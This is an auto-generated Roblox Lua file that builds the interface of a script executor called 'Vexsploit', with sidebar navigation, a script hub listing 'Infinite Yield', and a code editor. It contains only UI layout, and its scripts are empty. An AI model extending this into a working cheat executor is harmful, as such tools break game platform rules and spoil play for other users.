--[=[
 d888b  db    db d888888b      .d888b.      db      db    db  .d8b.  
88' Y8b 88    88   `88'        VP  `8D      88      88    88 d8' `8b 
88      88    88    88            odD'      88      88    88 88ooo88 
88  ooo 88    88    88          .88'        88      88    88 88~~~88 
88. ~8~ 88b  d88   .88.        j88.         88booo. 88b  d88 88   88    @uniquadev
 Y888P  ~Y8888P' Y888888P      888888D      Y88888P ~Y8888P' YP   YP  CONVERTER 
]=]

-- Instances: 138 | Scripts: 23 | Modules: 7 | Tags: 0
local G2L = {};

-- Workspace.Vexsploit
G2L["1"] = Instance.new("ScreenGui", game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui"));
G2L["1"]["IgnoreGuiInset"] = true;
G2L["1"]["DisplayOrder"] = 5;
G2L["1"]["ScreenInsets"] = Enum.ScreenInsets.DeviceSafeInsets;
G2L["1"]["Name"] = [[Vexsploit]];
G2L["1"]["ZIndexBehavior"] = Enum.ZIndexBehavior.Sibling;
G2L["1"]["ResetOnSpawn"] = false;


-- Workspace.Vexsploit.Sidebar
G2L["2"] = Instance.new("Frame", G2L["1"]);
G2L["2"]["BorderSizePixel"] = 0;
G2L["2"]["BackgroundColor3"] = Color3.fromRGB(7, 7, 7);
G2L["2"]["Size"] = UDim2.new(0.05543, 0, 1, 0);
G2L["2"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2"]["Name"] = [[Sidebar]];
G2L["2"]["BackgroundTransparency"] = 0.5;


-- Workspace.Vexsploit.Sidebar.BlurController
G2L["3"] = Instance.new("LocalScript", G2L["2"]);
G2L["3"]["Name"] = [[BlurController]];


-- Workspace.Vexsploit.Sidebar.Logo
G2L["4"] = Instance.new("ImageLabel", G2L["2"]);
G2L["4"]["BorderSizePixel"] = 0;
G2L["4"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["4"]["Image"] = [[rbxassetid://93164766002381]];
G2L["4"]["Size"] = UDim2.new(0, 96, 0, 96);
G2L["4"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["4"]["BackgroundTransparency"] = 1;
G2L["4"]["Name"] = [[Logo]];


-- Workspace.Vexsploit.Sidebar.Content
G2L["5"] = Instance.new("Frame", G2L["2"]);
G2L["5"]["BorderSizePixel"] = 0;
G2L["5"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["5"]["Size"] = UDim2.new(1, 0, 0.25907, 0);
G2L["5"]["Position"] = UDim2.new(0, 0, 0.1327, 0);
G2L["5"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["5"]["Name"] = [[Content]];
G2L["5"]["BackgroundTransparency"] = 1;


-- Workspace.Vexsploit.Sidebar.Content.UIListLayout
G2L["6"] = Instance.new("UIListLayout", G2L["5"]);
G2L["6"]["HorizontalAlignment"] = Enum.HorizontalAlignment.Center;
G2L["6"]["Padding"] = UDim.new(0, 25);
G2L["6"]["SortOrder"] = Enum.SortOrder.LayoutOrder;


-- Workspace.Vexsploit.Sidebar.Content.Home
G2L["7"] = Instance.new("ImageButton", G2L["5"]);
G2L["7"]["BorderSizePixel"] = 0;
G2L["7"]["BackgroundTransparency"] = 1;
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["7"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["7"]["Image"] = [[rbxassetid://10723407389]];
G2L["7"]["Size"] = UDim2.new(0, 40, 0, 40);
G2L["7"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["7"]["Name"] = [[Home]];
G2L["7"]["Position"] = UDim2.new(0.35417, 0, 0.10255, 0);


-- Workspace.Vexsploit.Sidebar.Content.Executor
G2L["8"] = Instance.new("ImageButton", G2L["5"]);
G2L["8"]["BorderSizePixel"] = 0;
G2L["8"]["BackgroundTransparency"] = 1;
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["8"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["8"]["Image"] = [[rbxassetid://10709807111]];
G2L["8"]["Size"] = UDim2.new(0, 40, 0, 40);
G2L["8"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["8"]["Name"] = [[Executor]];
G2L["8"]["Position"] = UDim2.new(0.25, 0, 0, 0);


-- Workspace.Vexsploit.Sidebar.Content.Hub
G2L["9"] = Instance.new("ImageButton", G2L["5"]);
G2L["9"]["BorderSizePixel"] = 0;
G2L["9"]["BackgroundTransparency"] = 1;
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["9"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["9"]["Image"] = [[rbxassetid://10723424963]];
G2L["9"]["Size"] = UDim2.new(0, 40, 0, 40);
G2L["9"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["9"]["Name"] = [[Hub]];
G2L["9"]["Position"] = UDim2.new(0.25, 0, 0, 0);


-- Workspace.Vexsploit.Sidebar.Content.Config
G2L["a"] = Instance.new("ImageButton", G2L["5"]);
G2L["a"]["BorderSizePixel"] = 0;
G2L["a"]["BackgroundTransparency"] = 1;
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["a"]["Image"] = [[rbxassetid://10747383470]];
G2L["a"]["Size"] = UDim2.new(0, 40, 0, 40);
G2L["a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["a"]["Name"] = [[Config]];
G2L["a"]["Position"] = UDim2.new(0.25, 0, 0, 0);


-- Workspace.Vexsploit.Sidebar.Content.Handler
G2L["b"] = Instance.new("LocalScript", G2L["5"]);
G2L["b"]["Name"] = [[Handler]];


-- Workspace.Vexsploit.Sidebar.Discord
G2L["c"] = Instance.new("ImageButton", G2L["2"]);
G2L["c"]["BorderSizePixel"] = 0;
G2L["c"]["ScaleType"] = Enum.ScaleType.Fit;
G2L["c"]["BackgroundTransparency"] = 1;
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["c"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["c"]["Image"] = [[rbxassetid://76181608348088]];
G2L["c"]["Size"] = UDim2.new(0, 40, 0, 40);
G2L["c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["c"]["Name"] = [[Discord]];
G2L["c"]["Position"] = UDim2.new(0.29167, 0, 0.95117, 0);


-- Workspace.Vexsploit.MainFrame
G2L["d"] = Instance.new("Frame", G2L["1"]);
G2L["d"]["BorderSizePixel"] = 0;
G2L["d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["d"]["Size"] = UDim2.new(0.94457, 0, 1, 0);
G2L["d"]["Position"] = UDim2.new(0.05543, 0, 0, 0);
G2L["d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["d"]["Name"] = [[MainFrame]];
G2L["d"]["BackgroundTransparency"] = 1;


-- Workspace.Vexsploit.MainFrame.Home
G2L["e"] = Instance.new("Frame", G2L["d"]);
G2L["e"]["Visible"] = false;
G2L["e"]["BorderSizePixel"] = 0;
G2L["e"]["BackgroundColor3"] = Color3.fromRGB(7, 7, 7);
G2L["e"]["Size"] = UDim2.new(0, 1024, 0, 613);
G2L["e"]["Position"] = UDim2.new(0.15767, 0, 0.1741, 0);
G2L["e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["e"]["Name"] = [[Home]];
G2L["e"]["BackgroundTransparency"] = 0.5;


-- Workspace.Vexsploit.MainFrame.Home.BlurController
G2L["f"] = Instance.new("LocalScript", G2L["e"]);
G2L["f"]["Name"] = [[BlurController]];


-- Workspace.Vexsploit.MainFrame.Home.UICorner
G2L["10"] = Instance.new("UICorner", G2L["e"]);
G2L["10"]["CornerRadius"] = UDim.new(0, 6);


-- Workspace.Vexsploit.MainFrame.Home.HomeControls
G2L["11"] = Instance.new("Frame", G2L["e"]);
G2L["11"]["BorderSizePixel"] = 0;
G2L["11"]["BackgroundColor3"] = Color3.fromRGB(7, 7, 7);
G2L["11"]["Size"] = UDim2.new(0, 1024, 0, 124);
G2L["11"]["Position"] = UDim2.new(-0, 0, 1.03263, 0);
G2L["11"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["11"]["Name"] = [[HomeControls]];
G2L["11"]["BackgroundTransparency"] = 0.5;


-- Workspace.Vexsploit.MainFrame.Home.HomeControls.UICorner
G2L["12"] = Instance.new("UICorner", G2L["11"]);
G2L["12"]["CornerRadius"] = UDim.new(0, 6);


-- Workspace.Vexsploit.MainFrame.Home.HomeControls.BlurController
G2L["13"] = Instance.new("LocalScript", G2L["11"]);
G2L["13"]["Name"] = [[BlurController]];


-- Workspace.Vexsploit.MainFrame.Home.HomeControls.ImageLabel
G2L["14"] = Instance.new("ImageLabel", G2L["11"]);
G2L["14"]["BorderSizePixel"] = 0;
G2L["14"]["ScaleType"] = Enum.ScaleType.Crop;
G2L["14"]["BackgroundColor3"] = Color3.fromRGB(7, 7, 7);
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["14"]["Image"] = [[rbxasset://textures/ui/GuiImagePlaceholder.png]];
G2L["14"]["Size"] = UDim2.new(0, 50, 0, 50);
G2L["14"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["14"]["Position"] = UDim2.new(0, 5, 0.59677, -5);


-- Workspace.Vexsploit.MainFrame.Home.HomeControls.ImageLabel.UICorner
G2L["15"] = Instance.new("UICorner", G2L["14"]);
G2L["15"]["CornerRadius"] = UDim.new(1, 0);


-- Workspace.Vexsploit.MainFrame.Home.HomeControls.ImageLabel.LocalScript
G2L["16"] = Instance.new("LocalScript", G2L["14"]);



-- Workspace.Vexsploit.MainFrame.Home.HomeControls.Username
G2L["17"] = Instance.new("TextLabel", G2L["11"]);
G2L["17"]["TextWrapped"] = true;
G2L["17"]["BorderSizePixel"] = 0;
G2L["17"]["TextSize"] = 24;
G2L["17"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["17"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["17"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["17"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["17"]["BackgroundTransparency"] = 1;
G2L["17"]["Size"] = UDim2.new(0, 959, 0, 50);
G2L["17"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["17"]["Text"] = [[USER]];
G2L["17"]["Name"] = [[Username]];
G2L["17"]["Position"] = UDim2.new(0.06354, 0, 0.55645, 0);


-- Workspace.Vexsploit.MainFrame.Home.HomeControls.Username.LocalScript
G2L["18"] = Instance.new("LocalScript", G2L["17"]);



-- Workspace.Vexsploit.MainFrame.Home.HomeControls.FPS
G2L["19"] = Instance.new("TextLabel", G2L["11"]);
G2L["19"]["TextWrapped"] = true;
G2L["19"]["BorderSizePixel"] = 0;
G2L["19"]["TextSize"] = 24;
G2L["19"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["19"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["19"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["19"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["19"]["BackgroundTransparency"] = 1;
G2L["19"]["Size"] = UDim2.new(0, 75, 0, 69);
G2L["19"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["19"]["Text"] = [[FPS]];
G2L["19"]["Name"] = [[FPS]];
G2L["19"]["Position"] = UDim2.new(0.00397, 0, 0, 0);


-- Workspace.Vexsploit.MainFrame.Home.HomeControls.FPS.FPS
G2L["1a"] = Instance.new("LocalScript", G2L["19"]);
G2L["1a"]["Name"] = [[FPS]];


-- Workspace.Vexsploit.MainFrame.Home.Changelog
G2L["1b"] = Instance.new("ScrollingFrame", G2L["e"]);
G2L["1b"]["Active"] = true;
G2L["1b"]["BorderSizePixel"] = 0;
G2L["1b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1b"]["Name"] = [[Changelog]];
G2L["1b"]["Size"] = UDim2.new(0, 1024, 0, 246);
G2L["1b"]["ScrollBarImageColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1b"]["BackgroundTransparency"] = 1;


-- Workspace.Vexsploit.MainFrame.Home.Changelog.TextLabel
G2L["1c"] = Instance.new("TextLabel", G2L["1b"]);
G2L["1c"]["BorderSizePixel"] = 0;
G2L["1c"]["TextSize"] = 24;
G2L["1c"]["TextYAlignment"] = Enum.TextYAlignment.Top;
G2L["1c"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1c"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["1c"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1c"]["BackgroundTransparency"] = 1;
G2L["1c"]["Size"] = UDim2.new(0, 1024, 0, 100);
G2L["1c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1c"]["Text"] = [[Version idk: Project created]];


-- Workspace.Vexsploit.MainFrame.Home.Changelog.TextLabel.UIPadding
G2L["1d"] = Instance.new("UIPadding", G2L["1c"]);
G2L["1d"]["PaddingTop"] = UDim.new(0, 5);


-- Workspace.Vexsploit.MainFrame.Home.Changelog.UIListLayout
G2L["1e"] = Instance.new("UIListLayout", G2L["1b"]);
G2L["1e"]["SortOrder"] = Enum.SortOrder.LayoutOrder;


-- Workspace.Vexsploit.MainFrame.Config
G2L["1f"] = Instance.new("Frame", G2L["d"]);
G2L["1f"]["Visible"] = false;
G2L["1f"]["BorderSizePixel"] = 0;
G2L["1f"]["BackgroundColor3"] = Color3.fromRGB(7, 7, 7);
G2L["1f"]["Size"] = UDim2.new(0, 1024, 0, 613);
G2L["1f"]["Position"] = UDim2.new(0.15767, 0, 0.1741, 0);
G2L["1f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1f"]["Name"] = [[Config]];
G2L["1f"]["BackgroundTransparency"] = 0.5;


-- Workspace.Vexsploit.MainFrame.Config.BlurController
G2L["20"] = Instance.new("LocalScript", G2L["1f"]);
G2L["20"]["Name"] = [[BlurController]];


-- Workspace.Vexsploit.MainFrame.Config.UICorner
G2L["21"] = Instance.new("UICorner", G2L["1f"]);
G2L["21"]["CornerRadius"] = UDim.new(0, 6);


-- Workspace.Vexsploit.MainFrame.Hub
G2L["22"] = Instance.new("Frame", G2L["d"]);
G2L["22"]["Visible"] = false;
G2L["22"]["BorderSizePixel"] = 0;
G2L["22"]["BackgroundColor3"] = Color3.fromRGB(7, 7, 7);
G2L["22"]["Size"] = UDim2.new(0, 1024, 0, 613);
G2L["22"]["Position"] = UDim2.new(0.15767, 0, 0.1741, 0);
G2L["22"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["22"]["Name"] = [[Hub]];
G2L["22"]["BackgroundTransparency"] = 0.5;


-- Workspace.Vexsploit.MainFrame.Hub.BlurController
G2L["23"] = Instance.new("LocalScript", G2L["22"]);
G2L["23"]["Name"] = [[BlurController]];


-- Workspace.Vexsploit.MainFrame.Hub.UICorner
G2L["24"] = Instance.new("UICorner", G2L["22"]);
G2L["24"]["CornerRadius"] = UDim.new(0, 6);


-- Workspace.Vexsploit.MainFrame.Hub.idk
G2L["25"] = Instance.new("Frame", G2L["22"]);
G2L["25"]["BorderSizePixel"] = 0;
G2L["25"]["BackgroundColor3"] = Color3.fromRGB(7, 7, 7);
G2L["25"]["Size"] = UDim2.new(0, 1024, 0, 124);
G2L["25"]["Position"] = UDim2.new(-0, 0, 1.03263, 0);
G2L["25"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["25"]["Name"] = [[idk]];
G2L["25"]["BackgroundTransparency"] = 0.5;


-- Workspace.Vexsploit.MainFrame.Hub.idk.UICorner
G2L["26"] = Instance.new("UICorner", G2L["25"]);
G2L["26"]["CornerRadius"] = UDim.new(0, 6);


-- Workspace.Vexsploit.MainFrame.Hub.idk.BlurController
G2L["27"] = Instance.new("LocalScript", G2L["25"]);
G2L["27"]["Name"] = [[BlurController]];


-- Workspace.Vexsploit.MainFrame.Hub.idk.TextLabel
G2L["28"] = Instance.new("TextLabel", G2L["25"]);
G2L["28"]["BorderSizePixel"] = 0;
G2L["28"]["TextSize"] = 24;
G2L["28"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["28"]["FontFace"] = Font.new([[rbxassetid://12187371324]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["28"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["28"]["BackgroundTransparency"] = 1;
G2L["28"]["Size"] = UDim2.new(0, 1024, 0, 50);
G2L["28"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["28"]["Text"] = [[From Vexos:]];


-- Workspace.Vexsploit.MainFrame.Hub.idk.ScrollingFrame
G2L["29"] = Instance.new("ScrollingFrame", G2L["25"]);
G2L["29"]["Active"] = true;
G2L["29"]["BorderSizePixel"] = 0;
G2L["29"]["VerticalScrollBarInset"] = Enum.ScrollBarInset.Always;
G2L["29"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["29"]["Size"] = UDim2.new(0, 1024, 0, 74);
G2L["29"]["ScrollBarImageColor3"] = Color3.fromRGB(0, 0, 0);
G2L["29"]["Position"] = UDim2.new(0, 0, 0.40323, 0);
G2L["29"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["29"]["BackgroundTransparency"] = 1;


-- Workspace.Vexsploit.MainFrame.Hub.idk.ScrollingFrame.VexScript1
G2L["2a"] = Instance.new("TextButton", G2L["29"]);
G2L["2a"]["BorderSizePixel"] = 0;
G2L["2a"]["TextSize"] = 20;
G2L["2a"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2a"]["BackgroundColor3"] = Color3.fromRGB(7, 7, 7);
G2L["2a"]["FontFace"] = Font.new([[rbxassetid://12187371324]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["2a"]["BackgroundTransparency"] = 0.7;
G2L["2a"]["Size"] = UDim2.new(1, 0, 0.14066, 0);
G2L["2a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2a"]["Text"] = [[Vex hub]];
G2L["2a"]["Name"] = [[VexScript1]];
G2L["2a"]["Position"] = UDim2.new(0, 0, -2.02899, 0);


-- Workspace.Vexsploit.MainFrame.Hub.idk.ScrollingFrame.VexScript1.UICorner
G2L["2b"] = Instance.new("UICorner", G2L["2a"]);
G2L["2b"]["CornerRadius"] = UDim.new(0, 6);


-- Workspace.Vexsploit.MainFrame.Hub.idk.ScrollingFrame.VexScript1.UIStroke
G2L["2c"] = Instance.new("UIStroke", G2L["2a"]);
G2L["2c"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["2c"]["Thickness"] = 1.5;
G2L["2c"]["Color"] = Color3.fromRGB(84, 67, 67);


-- Workspace.Vexsploit.MainFrame.Hub.idk.ScrollingFrame.UIListLayout
G2L["2d"] = Instance.new("UIListLayout", G2L["29"]);
G2L["2d"]["SortOrder"] = Enum.SortOrder.LayoutOrder;


-- Workspace.Vexsploit.MainFrame.Hub.idk.ScrollingFrame.UIPadding
G2L["2e"] = Instance.new("UIPadding", G2L["29"]);
G2L["2e"]["PaddingTop"] = UDim.new(0, 5);
G2L["2e"]["PaddingRight"] = UDim.new(0, 5);
G2L["2e"]["PaddingLeft"] = UDim.new(0, 5);


-- Workspace.Vexsploit.MainFrame.Hub.ScrollingFrame
G2L["2f"] = Instance.new("ScrollingFrame", G2L["22"]);
G2L["2f"]["Active"] = true;
G2L["2f"]["BorderSizePixel"] = 0;
G2L["2f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2f"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["2f"]["ScrollBarImageColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2f"]["BackgroundTransparency"] = 1;


-- Workspace.Vexsploit.MainFrame.Hub.ScrollingFrame.Frame
G2L["30"] = Instance.new("Frame", G2L["2f"]);
G2L["30"]["BorderSizePixel"] = 0;
G2L["30"]["BackgroundColor3"] = Color3.fromRGB(7, 7, 7);
G2L["30"]["Size"] = UDim2.new(0, 256, 0, 173);
G2L["30"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["30"]["BackgroundTransparency"] = 0.6;


-- Workspace.Vexsploit.MainFrame.Hub.ScrollingFrame.Frame.TextLabel
G2L["31"] = Instance.new("TextLabel", G2L["30"]);
G2L["31"]["BorderSizePixel"] = 0;
G2L["31"]["TextSize"] = 28;
G2L["31"]["BackgroundColor3"] = Color3.fromRGB(7, 7, 7);
G2L["31"]["FontFace"] = Font.new([[rbxassetid://12187371324]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["31"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["31"]["BackgroundTransparency"] = 0.6;
G2L["31"]["Size"] = UDim2.new(0, 257, 0, 50);
G2L["31"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["31"]["Text"] = [[Infinite Yield]];
G2L["31"]["Position"] = UDim2.new(-0.00391, 0, 0.71098, 0);


-- Workspace.Vexsploit.MainFrame.Hub.ScrollingFrame.Frame.TextButton
G2L["32"] = Instance.new("TextButton", G2L["30"]);
G2L["32"]["BorderSizePixel"] = 0;
G2L["32"]["TextSize"] = 14;
G2L["32"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["32"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["32"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["32"]["BackgroundTransparency"] = 1;
G2L["32"]["Size"] = UDim2.new(0, 256, 0, 123);
G2L["32"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["32"]["Text"] = [[]];


-- Workspace.Vexsploit.MainFrame.Hub.ScrollingFrame.Frame.TextButton.LocalScript
G2L["33"] = Instance.new("LocalScript", G2L["32"]);



-- Workspace.Vexsploit.MainFrame.Hub.ScrollingFrame.UIPadding
G2L["34"] = Instance.new("UIPadding", G2L["2f"]);
G2L["34"]["PaddingTop"] = UDim.new(0, 10);
G2L["34"]["PaddingLeft"] = UDim.new(0, 10);


-- Workspace.Vexsploit.MainFrame.Hub.ScrollingFrame.UIGridLayout
G2L["35"] = Instance.new("UIGridLayout", G2L["2f"]);
G2L["35"]["CellSize"] = UDim2.new(0, 256, 0, 173);
G2L["35"]["SortOrder"] = Enum.SortOrder.LayoutOrder;


-- Workspace.Vexsploit.MainFrame.Hub.Scripts
G2L["36"] = Instance.new("ModuleScript", G2L["22"]);
G2L["36"]["Name"] = [[Scripts]];


-- Workspace.Vexsploit.MainFrame.Hub.Frame
G2L["37"] = Instance.new("Frame", G2L["22"]);
G2L["37"]["Visible"] = false;
G2L["37"]["BorderSizePixel"] = 0;
G2L["37"]["BackgroundColor3"] = Color3.fromRGB(7, 7, 7);
G2L["37"]["Size"] = UDim2.new(0, 256, 0, 173);
G2L["37"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["37"]["BackgroundTransparency"] = 0.6;


-- Workspace.Vexsploit.MainFrame.Hub.Frame.TextLabel
G2L["38"] = Instance.new("TextLabel", G2L["37"]);
G2L["38"]["BorderSizePixel"] = 0;
G2L["38"]["TextSize"] = 28;
G2L["38"]["BackgroundColor3"] = Color3.fromRGB(7, 7, 7);
G2L["38"]["FontFace"] = Font.new([[rbxassetid://12187371324]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["38"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["38"]["BackgroundTransparency"] = 0.6;
G2L["38"]["Size"] = UDim2.new(0, 257, 0, 50);
G2L["38"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["38"]["Text"] = [[Infinite Yield]];
G2L["38"]["Position"] = UDim2.new(-0.00391, 0, 0.71098, 0);


-- Workspace.Vexsploit.MainFrame.Hub.Frame.TextButton
G2L["39"] = Instance.new("TextButton", G2L["37"]);
G2L["39"]["BorderSizePixel"] = 0;
G2L["39"]["TextSize"] = 14;
G2L["39"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["39"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["39"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["39"]["BackgroundTransparency"] = 1;
G2L["39"]["Size"] = UDim2.new(0, 256, 0, 123);
G2L["39"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["39"]["Text"] = [[]];


-- Workspace.Vexsploit.MainFrame.Executor1
G2L["3a"] = Instance.new("Frame", G2L["d"]);
G2L["3a"]["BorderSizePixel"] = 0;
G2L["3a"]["BackgroundColor3"] = Color3.fromRGB(7, 7, 7);
G2L["3a"]["Size"] = UDim2.new(0, 1119, 0, 867);
G2L["3a"]["Position"] = UDim2.new(0.01769, 0, 0.02976, 0);
G2L["3a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["3a"]["Name"] = [[Executor1]];
G2L["3a"]["BackgroundTransparency"] = 0.5;


-- Workspace.Vexsploit.MainFrame.Executor1.BlurController
G2L["3b"] = Instance.new("LocalScript", G2L["3a"]);
G2L["3b"]["Name"] = [[BlurController]];


-- Workspace.Vexsploit.MainFrame.Executor1.UICorner
G2L["3c"] = Instance.new("UICorner", G2L["3a"]);
G2L["3c"]["CornerRadius"] = UDim.new(0, 6);


-- Workspace.Vexsploit.MainFrame.Executor1.CodeEditor
G2L["3d"] = Instance.new("ScrollingFrame", G2L["3a"]);
G2L["3d"]["Active"] = true;
G2L["3d"]["BorderSizePixel"] = 0;
G2L["3d"]["BackgroundColor3"] = Color3.fromRGB(46, 46, 46);
G2L["3d"]["Name"] = [[CodeEditor]];
G2L["3d"]["ScrollBarImageTransparency"] = 0.7;
G2L["3d"]["AutomaticCanvasSize"] = Enum.AutomaticSize.XY;
G2L["3d"]["Size"] = UDim2.new(0, 1085, 0, 717);
G2L["3d"]["ScrollBarImageColor3"] = Color3.fromRGB(0, 0, 0);
G2L["3d"]["Position"] = UDim2.new(0.01485, 0, 0.0624, 0);
G2L["3d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["3d"]["BackgroundTransparency"] = 0.5;


-- Workspace.Vexsploit.MainFrame.Executor1.CodeEditor.Frame
G2L["3e"] = Instance.new("Frame", G2L["3d"]);
G2L["3e"]["BorderSizePixel"] = 0;
G2L["3e"]["BackgroundColor3"] = Color3.fromRGB(40, 40, 40);
G2L["3e"]["AutomaticSize"] = Enum.AutomaticSize.Y;
G2L["3e"]["Size"] = UDim2.new(0, 50, 10, 0);
G2L["3e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["3e"]["BackgroundTransparency"] = 0.5;


-- Workspace.Vexsploit.MainFrame.Executor1.CodeEditor.Frame.LineHandler
G2L["3f"] = Instance.new("LocalScript", G2L["3e"]);
G2L["3f"]["Name"] = [[LineHandler]];


-- Workspace.Vexsploit.MainFrame.Executor1.CodeEditor.Frame.UIListLayout
G2L["40"] = Instance.new("UIListLayout", G2L["3e"]);
G2L["40"]["HorizontalAlignment"] = Enum.HorizontalAlignment.Center;
G2L["40"]["SortOrder"] = Enum.SortOrder.LayoutOrder;
G2L["40"]["ItemLineAlignment"] = Enum.ItemLineAlignment.End;


-- Workspace.Vexsploit.MainFrame.Executor1.CodeEditor.Frame.UICorner
G2L["41"] = Instance.new("UICorner", G2L["3e"]);
G2L["41"]["CornerRadius"] = UDim.new(0, 6);


-- Workspace.Vexsploit.MainFrame.Executor1.CodeEditor.Code
G2L["42"] = Instance.new("TextBox", G2L["3d"]);
G2L["42"]["Name"] = [[Code]];
G2L["42"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["42"]["ZIndex"] = -1;
G2L["42"]["BorderSizePixel"] = 0;
G2L["42"]["TextSize"] = 14;
G2L["42"]["TextColor3"] = Color3.fromRGB(205, 205, 205);
G2L["42"]["TextYAlignment"] = Enum.TextYAlignment.Top;
G2L["42"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["42"]["FontFace"] = Font.new([[rbxassetid://12187362578]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["42"]["AutomaticSize"] = Enum.AutomaticSize.XY;
G2L["42"]["MultiLine"] = true;
G2L["42"]["ClearTextOnFocus"] = false;
G2L["42"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["42"]["Position"] = UDim2.new(0.05568, 0, -0, 0);
G2L["42"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["42"]["Text"] = [[]];
G2L["42"]["BackgroundTransparency"] = 1;


-- Workspace.Vexsploit.MainFrame.Executor1.CodeEditor.Code.UIPadding
G2L["43"] = Instance.new("UIPadding", G2L["42"]);
G2L["43"]["PaddingLeft"] = UDim.new(0, 6);


